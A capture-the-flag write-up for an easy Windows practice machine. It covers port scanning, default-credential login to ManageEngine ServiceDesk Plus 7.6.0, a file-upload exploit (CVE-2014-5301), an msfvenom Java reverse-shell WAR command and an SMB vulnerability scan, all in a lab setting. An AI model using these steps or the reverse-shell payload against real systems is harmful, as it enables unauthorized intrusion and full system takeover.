> title: ProvingGround_Practice-helpdesk

machine info: This is a 10 point Windows machine. Offensive Difficulty is Easy, same as Community Rated Difficulty.

## Information Gathering

First of all, I use masscan scanning the open ports.

```
masscan -p1-65535,U:53,69,161 $target_ip --rate=5000 -e tun0 -oG masscan-$target_ip
```

![image-20230209204050038](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209204050038.png)

The output file shows me some ports, I use nmap for further infomation.

```
port_str=`cat masscan-$target_ip | grep "/open/tcp/" |cut -f 4 -d ":" |cut -f 2 -d " " |cut -f 1 -d "/" | tr '\n' ',' |sed 's/.$//'`;nmap -A -p$port_str $target_ip -oN nmap-$target_ip
```

![image-20230209205218855](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209205218855.png)

## Initial Access

Web Service is ManageEngine ServiceDesk Plus, and the version is 7.6.0.

![image-20230209210948579](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209210948579.png)

Searching in google for default credentials.

![image-20230209211510356](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209211510356.png)

Fortunately, this credential can be used in this machine.

Using searchsploit to get if there any exploits can execute. As the result, there is a File Upload module in metasploit. `ManageEngine (Multiple Products) - (Authenticated) Arbitrary File Upload (Metasploit)                                                                                                                     | java/remote/35845.rb`

Usually, the metasploit scripts carry the CVE number, so does it.

![image-20230209212040912](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209212040912.png)

After google, a python script in [github]([exploits/CVE-2014-5301.py at master · PeterSufliarsky/exploits (github.com)](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)). I'm trying not to use metasploit in this machine, but I can't find a perfect war shell not using msf. 

Now, I have to use msf:

```
msfvenom -p java/shell_reverse_tcp LHOST=ip LPORT=port -f war > shell.war
```

Easily using the python script reverse shell finally.

![image-20230209221142446](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209221142446.png)

![image-20230209221155390](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209221155390.png)

The user we login is `nt authority\system`,just cat the flag.
that's all: )

## Other Path

Scanning the smb vulnerable in nmap. Why to do that? You can see the version of Windows if pretty old, it might be a smb vulns!

```
nmap --script smb-vuln*.nse -p 139,445 $target_ip -Pn -oN smb-vuln-scan

```

There is a result.

![image-20230209221952021](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209221952021.png)

After google it, exploitdb shows me it is a RCE vuln. It is hard to write the payload by self, so still using msf.

![image-20230209223128267](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20230209223128267.png)

same as before.